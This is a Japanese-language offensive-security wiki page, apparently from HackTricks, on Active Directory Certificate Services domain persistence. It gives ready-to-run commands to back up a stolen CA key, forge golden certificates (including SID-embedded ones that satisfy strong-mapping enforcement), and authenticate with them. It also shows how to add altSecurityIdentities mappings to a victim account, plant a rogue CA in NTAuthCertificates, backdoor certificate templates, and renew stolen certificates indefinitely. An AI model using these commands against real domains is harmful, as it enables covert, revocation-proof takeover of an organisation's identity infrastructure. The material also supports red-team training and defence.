# AD CS Domain Persistence

{{#include ../../../banners/hacktricks-training.md}}

**これは、[https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf) で共有されている domain persistence techniques の概要です**。詳細については同資料を確認してください。<sup>[[5]](#references)</sup>

## Forging Certificates with Stolen CA Certificates (Golden Certificate) - DPERSIST1

証明書が CA certificate であることをどのように判断できますか？

以下の条件を複数満たしている場合、証明書が CA certificate であると判断できます。<sup>[[5]](#references)</sup>

- 証明書が CA server に保存されており、その private key がマシンの DPAPI、または operating system がサポートしている場合は TPM/HSM などの hardware によって保護されている。
- 証明書の Issuer フィールドと Subject フィールドが、CA の distinguished name と一致している。
- CA certificates にのみ存在する「CA Version」extension がある。
- 証明書に Extended Key Usage (EKU) fields がない。

この証明書の private key を抽出するには、CA server 上の `certsrv.msc` tool を built-in GUI 経由で使用する方法が、サポートされている手段です。ただし、この証明書は system 内に保存されている他の証明書と違いがないため、[THEFT2 technique](certificate-theft.md#user-certificate-theft-via-dpapi-theft2) などの methods を extraction に適用できます。

証明書と private key は、以下の command を使用して Certipy で取得することもできます。<sup>[[2]](#references)</sup>
```bash
certipy ca 'corp.local/administrator@ca.corp.local' -hashes :123123.. -backup
```
CA 証明書とその秘密鍵を `.pfx` 形式で取得すると、[ForgeCert](https://github.com/GhostPack/ForgeCert) のようなツールを利用して有効な証明書を生成できます：
```bash
# Generating a new certificate with ForgeCert
ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword Password123! --Subject "CN=User" --SubjectAltName localadmin@theshire.local --NewCertPath localadmin.pfx --NewCertPassword Password123!

# Generating a new certificate with certipy
certipy forge -ca-pfx CORP-DC-CA.pfx -upn administrator@corp.local -subject 'CN=Administrator,CN=Users,DC=CORP,DC=LOCAL'

# Authenticating using the new certificate with Rubeus
Rubeus.exe asktgt /user:localdomain /certificate:C:\ForgeCert\localadmin.pfx /password:Password123!

# Authenticating using the new certificate with certipy
certipy auth -pfx administrator_forged.pfx -dc-ip 172.16.126.128
```
> [!WARNING]
> 証明書偽造の対象となるユーザーは、プロセスを成功させるためにアクティブな状態で、Active Directory で認証できなければなりません。krbtgt のような特殊なアカウント用に証明書を偽造しても効果はありません。

この偽造証明書は、指定された終了日時まで、かつ **ルート CA 証明書が有効である限り**（通常は 5 年から **10 年以上**）**有効**です。また、**マシン**にも有効であるため、**S4U2Self** と組み合わせることで、攻撃者は CA 証明書が有効な限り、**任意のドメインマシン上で persistence を維持**できます。\
さらに、この方法で**生成された証明書**は、CA がそれらを認識していないため、**revoke できません**。

### Strong Certificate Mapping Enforcement（2025 年以降）下での運用

2025 年 2 月 11 日（KB5014754 の展開後）以降、domain controller は証明書マッピングに対してデフォルトで **Full Enforcement** を適用します。実際には、偽造証明書は次のいずれかを満たす必要があります。

- 対象アカウントへの strong binding（たとえば SID security extension）を含む、または
- 対象オブジェクトの `altSecurityIdentities` 属性に strong な明示的マッピングを設定する。<sup>[[1]](#references)</sup>

persistence のための信頼性の高いアプローチは、盗み出した Enterprise CA につながる偽造証明書を発行し、victim principal に strong な明示的マッピングを追加することです：
```powershell
# Example: map a forged cert to a target account using Issuer+Serial (strong mapping)
$Issuer  = 'DC=corp,DC=local,CN=CORP-DC-CA'           # reverse DN format expected by AD
$SerialR = '1200000000AC11000000002B'                  # serial in reversed byte order
$Map     = "X509:<I>$Issuer<SR>$SerialR"             # strong mapping format
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
注記
- SID security extension を含む forged certificates を作成できる場合、それらは Full Enforcement の下でも暗黙的にマッピングされます。それ以外の場合は、explicit strong mappings を優先してください。explicit mappings の詳細については、[account-persistence](account-persistence.md) を参照してください。
- Revocation はここでは defenders の助けになりません。forged certificates は CA database に認識されないため、revocation できません。

#### Full-Enforcement compatible forging（SID-aware）

更新された tooling では SID を直接埋め込めるため、DCs が weak mappings を拒否する場合でも golden certificates を使用できます:<sup>[[3]](#references)</sup>
```bash
# Certify 2.0 integrates ForgeCert and can embed SID
Certify.exe forge --ca-pfx CORP-DC-CA.pfx --ca-pass Password123! \
--upn administrator@corp.local --sid S-1-5-21-1111111111-2222222222-3333333333-500 \
--outfile administrator_sid.pfx

# Certipy also supports SID in forged certs
certipy forge -ca-pfx CORP-DC-CA.pfx -upn administrator@corp.local \
-sid S-1-5-21-1111111111-2222222222-3333333333-500 -out administrator_sid.pfx
```
SIDを埋め込むことで、監視されている可能性のある `altSecurityIdentities` に触れる必要がなくなり、strong mapping checksも引き続き満たせます。

## Rogue CA Certificatesを信頼させる - DPERSIST2

`NTAuthCertificates` objectは、その`cacertificate` attributeに1つ以上の **CA certificates** を格納するよう定義されており、Active Directory (AD)が利用します。**domain controller**による検証プロセスでは、認証に使用する **certificate** のIssuer fieldで指定された **CA** と一致するエントリが`NTAuthCertificates` objectにあるか確認します。一致するエントリが見つかると、認証が進行します。<sup>[[5]](#references)</sup>

攻撃者がこのAD objectを制御できる場合、self-signed CA certificateを`NTAuthCertificates` objectに追加できます。通常、このobjectを変更する権限が付与されているのは、**Enterprise Admin** groupのメンバー、ならびに**forest root’s domain**の**Domain Admins**または**Administrators**のみです。`certutil.exe`を使用して`certutil.exe -dspublish -f C:\Temp\CERT.crt NTAuthCA`コマンドを実行するか、[**PKI Health Tool**](https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/import-third-party-ca-to-enterprise-ntauth-store#method-1---import-a-certificate-by-using-the-pki-health-tool)を使用して`NTAuthCertificates` objectを編集できます。

このtechniqueで役立つ追加のコマンド：
```bash
# Add/remove and inspect the Enterprise NTAuth store
certutil -enterprise -f -AddStore NTAuth C:\Temp\CERT.crt
certutil -enterprise -viewstore NTAuth
certutil -enterprise -delstore NTAuth <Thumbprint>

# (Optional) publish into AD CA containers to improve chain building across the forest
certutil -dspublish -f C:\Temp\CERT.crt RootCA          # CN=Certification Authorities
certutil -dspublish -f C:\Temp\CERT.crt CA               # CN=AIA
```
この機能は、前述の ForgeCert を使用して証明書を動的に生成する手法と組み合わせた場合に、特に有効です。

> 2025年以降の mapping に関する考慮事項: NTAuth に rogue CA を配置しても、発行元 CA への trust が確立されるだけです。DC が **Full Enforcement** の場合に leaf certificate を logon に使用するには、leaf に SID security extension が含まれているか、対象オブジェクトに対して強力な明示的 mapping（例えば `altSecurityIdentities` の Issuer+Serial）が存在する必要があります。{{#ref}}account-persistence.md{{#endref}} を参照してください。

## 悪意ある設定ミス - DPERSIST3

AD CS コンポーネントの **security descriptor** を変更することで、**persistence** を確保できる機会は数多く存在します。"[Domain Escalation](domain-escalation.md)" セクションで説明されている変更は、高い権限を持つ attacker によって悪用目的で実装できます。これには、以下のような機密性の高いコンポーネントへの "control rights"（WriteOwner/WriteDACL など）の追加が含まれます:<sup>[[5]](#references)</sup>

- **CA server’s AD computer** object
- **CA server’s RPC/DCOM server**
- **`CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`** 内の任意の **descendant AD object or container**（例えば、Certificate Templates container、Certification Authorities container、NTAuthCertificates object など）
- デフォルトまたは組織によって AD CS の制御権限を委任された **AD groups**（組み込みの Cert Publishers group と、そのメンバーなど）

悪意ある実装の例として、domain 内で **elevated permissions** を持つ attacker が、デフォルトの **`User`** certificate template に **`WriteOwner`** permission を追加し、その権限の principal を attacker 自身にするケースが挙げられます。これを悪用するため、attacker はまず **`User`** template の ownership を自分自身に変更します。その後、template 上の **`mspki-certificate-name-flag`** を **1** に設定して **`ENROLLEE_SUPPLIES_SUBJECT`** を有効にし、user が request に Subject Alternative Name を指定できるようにします。続いて attacker は **template** を使用して **enroll** し、alternative name として **domain administrator** の名前を選択できます。取得した certificate は、DA として authentication に利用できます。

attacker が long-term domain persistence のために設定できる実用的な項目（詳細と detection については {{#ref}}domain-escalation.md{{#endref}} を参照）:

- requesters から SAN を許可する CA policy flags（例: `EDITF_ATTRIBUTESUBJECTALTNAME2` の有効化）。これにより、ESC1-like paths が引き続き exploitable になります。
- authentication-capable issuance を許可する template DACL または settings（例: Client Authentication EKU の追加、`CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` の有効化）。
- `NTAuthCertificates` object または CA containers の制御。これにより、defender が cleanup を試みても rogue issuers を継続的に再導入できます。

> [!TIP]
> KB5014754 以降の hardened environments では、これらの misconfigurations と明示的な strong mappings（`altSecurityIdentities`）を組み合わせることで、DC が strong mapping を enforce している場合でも、発行または forge した certificates を引き続き使用できます。

### Certificate renewal abuse (ESC14) for persistence

authentication-capable certificate（または Enrollment Agent certificate）を compromise すると、発行元 template が published のままで、CA が issuer chain を trust している限り、**renew** を無期限に実行できます。Renewal により元の identity bindings が維持されたまま validity が延長されるため、template が修正されるか CA が republished されない限り、eviction は困難になります。<sup>[[4]](#references)</sup>
```bash
# Renew a stolen user cert to extend validity
certipy req -ca CORP-DC-CA -template User -pfx stolen_user.pfx -renew -out user_renewed_2026.pfx

# Renew an on-behalf-of cert issued via an Enrollment Agent
certipy req -ca CORP-DC-CA -on-behalf-of 'CORP/victim' -pfx agent.pfx -renew -out victim_renewed.pfx
```
ドメインコントローラーが **Full Enforcement** の場合は、`-sid <victim SID>` を追加する（または SID セキュリティ拡張を引き続き含むテンプレートを使用する）ことで、`altSecurityIdentities` に触れずに更新されたリーフ証明書が引き続き強力にマッピングされるようにします。CA admin 権限を持つ攻撃者は、証明書を自身に発行する前に `policy\RenewalValidityPeriodUnits` を調整して、更新された証明書の有効期間を延長することもできます。<sup>[[2]](#references)[[4]](#references)</sup>


## References

- [1] [Microsoft KB5014754 – Certificate-based authentication changes on Windows domain controllers (enforcement timeline and strong mappings)](https://support.microsoft.com/en-au/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16)
- [2] [Certipy – Command Reference and forge/auth usage](https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference)
- [3] [SpecterOps – Certify 2.0 (integrated forge with SID support)](https://specterops.io/blog/2025/08/11/certify-2-0/)
- [4] [ESC14 renewal abuse overview](https://www.adcs-security.com/attacks/esc14)
- [5] [SpecterOps – Certified Pre-Owned: Abusing Active Directory Certificate Services](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf)

{{#include ../../../banners/hacktricks-training.md}}
